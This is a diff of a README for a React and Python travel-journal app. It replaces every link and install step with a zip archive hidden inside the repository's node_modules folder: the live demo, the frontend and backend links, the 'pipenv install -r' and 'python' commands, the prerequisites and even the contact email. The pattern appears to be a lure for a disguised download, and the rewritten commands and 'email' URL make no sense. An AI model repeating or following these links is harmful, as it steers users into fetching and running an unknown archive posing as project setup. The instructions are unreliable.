@@ -10,11 +10,11 @@ This app utilizes Formik for forms and Yup for validation, alongside Axios for A
 
 ## Live Demo
 
-Check out our deployed application: [View Live App](https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip)
+Check out our deployed application: [View Live App](https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip)
 
-Go to the following github account for frontend https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+Go to the following github account for frontend https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
 
-Go to the following github account for the backend https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+Go to the following github account for the backend https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
 
 ### Features
 1. User authentication (login, register, reset password)
@@ -57,7 +57,7 @@ The frontend is built using React and includes several pages and components:
 * A github account
 
 1. Open your terminal and go to the directory you wish to work from.
-2. Go to the following url using ur github account https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+2. Go to the following url using ur github account https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
 3. Go to the code tab and clone the ssh key
 4. Go back to the terminal and type git clone <-followed by the ssh key you copied /cloned ->
 5. Enter your new cloned repository and type in code .
@@ -82,7 +82,7 @@ The frontend is built using React and includes several pages and components:
 
      2. Install the backend dependencies:
 
-            pipenv install -r https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+            pipenv install -r https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
 
      3. Set up your environment variables in a .env file in the server directory:
 
@@ -91,11 +91,11 @@ The frontend is built using React and includes several pages and components:
             JWT_SECRET=your_jwt_secret
 
      4. Start the backend server:
-            python https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+            python https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
             
 ## Prerequisites
 1. Python 3.8 or higher
-2. https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+2. https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
 3. npm 
 4. PostgreSQL (or your chosen database)
 
@@ -107,7 +107,7 @@ The frontend is built using React and includes several pages and components:
 4. Styling: Bootstrap, css
 
 ## Support and contact details
-For any issues please email me at https://raw.githubusercontent.com/code-iddih/Travel-journal/main/node_modules/react-dev-utils/node_modules/color-convert/Travel-journal_2.9.zip
+For any issues please email me at https://github.com/code-iddih/Travel-journal/raw/refs/heads/main/node_modules/eslint-plugin-react-hooks/cjs/journal_Travel_v2.2.zip
 ### License
 Apache License 2.0
 
